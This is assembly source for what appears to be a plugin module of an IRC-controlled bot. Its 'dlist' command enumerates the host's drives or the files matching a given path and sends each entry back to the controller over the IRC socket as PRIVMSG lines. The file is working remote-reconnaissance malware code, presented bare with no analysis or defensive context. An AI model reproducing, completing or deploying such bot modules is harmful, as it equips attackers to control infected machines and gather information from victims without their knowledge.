;-----------------------------------------------------------------------
.386
.model flat, stdcall
option casemap:none

;-----------------------------------------------------------------------
include     project.inc
include     ..\..\common\misc.inc

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
dlist   proc    lpszline
    local   dwsocket, szmsgbuffer[1024]:byte, szreply[64]:byte, szbuffer1[MAX_PATH]:byte, szsleep[8]:byte, dwsleep
    local   hfind, fd:WIN32_FIND_DATA
    
    mov     eax, lpbot_info
    m2m     dwsocket, (sbot_data ptr [eax]).dwsocket
    
    ; to respond to. channel or user
    invoke  get_token, addr szbuffer1, lpszline, ' ', 0, FALSE
    invoke  get_token, addr szbuffer1, addr szbuffer1, ':', 1, FALSE
    invoke  get_token, addr szbuffer1, addr szbuffer1, '!', 0, FALSE
    
    invoke  get_token, addr szreply, lpszline, ' ', 2, FALSE
    .if     byte ptr szreply != '#'
        invoke  xcopy, addr szreply, addr szbuffer1, sizeof szbuffer1
    .endif

    ; .dlist -v C:\windows\* 1500
    ; second param (C:\windows\*)
    invoke  get_token, addr szbuffer1, lpszline, ':', 2, TRUE
    invoke  get_token, addr szbuffer1, addr szbuffer1, ' ', 1, TRUE
    invoke  get_token, addr szbuffer1, addr szbuffer1, '-', 0, TRUE
    
    ; third param
    invoke  get_token, addr szsleep, addr szbuffer1, ' ', 2, FALSE
    invoke  printf, SADD("sleep interval: %s"), addr szsleep
    invoke  atodw, addr szsleep
    mov     dwsleep, eax
    .if     dwsleep > 1000*60 || dwsleep < 1500
        mov     dwsleep, 1500
    .endif
    invoke  printf, SADD("sleep interval: %0.8X"), dwsleep

    invoke  get_token, addr szbuffer1, addr szbuffer1, ' ', 1, FALSE
    invoke  printf, SADD("directory: %s"), addr szbuffer1
    
    
    .if     byte ptr szbuffer1 == 0
        
        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[+] Drive list")   
        invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0

        invoke  GetLogicalDriveStrings, sizeof szbuffer1, addr szbuffer1
        .if     eax

            lea     ebx, szbuffer1
            .while  word ptr [ebx]
                invoke  GetDriveType, ebx
                switch  eax
                    case    DRIVE_REMOVABLE
                        mov     esi, offset szdrive_removable
                        
                    case    DRIVE_FIXED
                        mov     esi, offset szdrive_fixed
                        
                    case    DRIVE_REMOTE
                        mov     esi, offset szdrive_remote

                endsw

                invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :[%s] [%s]', EOL), addr szreply, ebx, esi
                invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0
                
                invoke  Sleep, dwsleep
                add     ebx, 4
            .endw
        
        .endif
        
        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[-] Drive list end.")
        invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0
    
    .else
    
        ; showing it
        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[+] Directory list:")
        invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0

        invoke  FindFirstFile, addr szbuffer1, addr fd
        mov     hfind, eax
        .if     eax != INVALID_HANDLE_VALUE

            .repeat
                invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :[*] [%lu] %s', EOL), addr szreply, fd.dwFileAttributes, addr fd.cFileName

                invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0    
                
                invoke  Sleep, dwsleep

                invoke  FindNextFile, hfind, addr fd
            
            .until  !eax

        .endif
        
        ; ok. done.
        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[-] Directory list end.")   
        invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0
        invoke  FindClose, hfind
    
    .endif
    ret
dlist   endp

;-----------------------------------------------------------------------
ibm_init    proc    lpsbot_data
    
    m2m     lpbot_info, lpsbot_data
    mov     eax, offset mdt
    
    ret
ibm_init    endp

end
;-----------------------------------------------------------------------
